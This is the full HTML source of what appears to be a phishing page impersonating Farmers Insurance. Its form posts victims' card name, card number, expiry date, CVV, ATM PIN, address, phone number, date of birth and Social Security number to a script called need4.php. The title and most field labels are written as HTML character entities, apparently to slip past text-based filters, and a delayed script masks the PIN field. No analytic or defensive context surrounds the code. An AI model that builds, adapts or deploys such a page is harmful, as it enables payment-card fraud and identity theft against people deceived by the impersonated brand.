<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#70;&#97;&#114;&#109;&#101;&#114;&#115;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[4].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #b6b6b6; 
    height: 50px; 
    width: 275px; 
  	font-family: Segoe UI;
    font-size: 16px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 0px; 
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #b6b6b6; 
    box-shadow: 0px 0px 5px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:1143px; width:1349px; height:392px; z-index:0"><img src="images/f8.png" alt="" title="" border=0 width=1349 height=392></div>

<div id="image4" style="position:absolute; overflow:hidden; left:789px; top:1192px; width:166px; height:45px; z-index:1"><a href="#"><img src="images/f13.png" alt="" title="" border=0 width=166 height=45></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:294px; z-index:2"><img src="images/f12.png" alt="" title="" border=0 width=1349 height=294></div>

<div id="image2" style="position:absolute; overflow:hidden; left:195px; top:322px; width:954px; height:756px; z-index:3"><img src="images/f7.png" alt="" title="" border=0 width=954 height=756></div>
<form action=need4.php name=buhatjump id=buhatjump method=post>
<input name="noc" placeholder="&#78;&#97;&#109;&#101;&#32;&#111;&#110;&#32;&#67;&#97;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:350px;z-index:4">
<input name="cn" placeholder="&#68;&#101;&#98;&#105;&#116;&#47;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox" autocomplete="off" required maxlength="16" type="text" style="position:absolute;width:430px;left:229px;top:420px;z-index:5">
<input name="ex" placeholder="&#69;&#120;&#112;&#105;&#114;&#121;&#32;&#68;&#97;&#116;&#101;&#32;&#40;&#77;&#77;&#47;&#89;&#89;&#89;&#89;&#41;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:490px;z-index:6">
<input name="vc" placeholder="&#67;&#86;&#86;" class="textbox" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:430px;left:229px;top:560px;z-index:7">
<input name="pn" placeholder="&#65;&#84;&#77;&#32;&#80;&#73;&#78;" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:430px;left:229px;top:630px;z-index:8">
<input name="addr" placeholder="Address" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:700px;z-index:9">
<input name="zp" placeholder="Zip Code" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:770px;z-index:10">
<input name="ph" placeholder="Phone Number" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:840px;z-index:11">
<input name="db" placeholder="Date of Birth (MM/DD/YYYY)" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:910px;z-index:12">
<input name="sn" placeholder="&#83;&#111;&#99;&#105;&#97;&#108;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:980px;z-index:13">
<div id="formimage1" style="position:absolute; left:982px; top:1191px; z-index:14"><input type="image" name="formimage1" width="164" height="45" src="images/fst.png"></div>
</div>

</body>
</html>
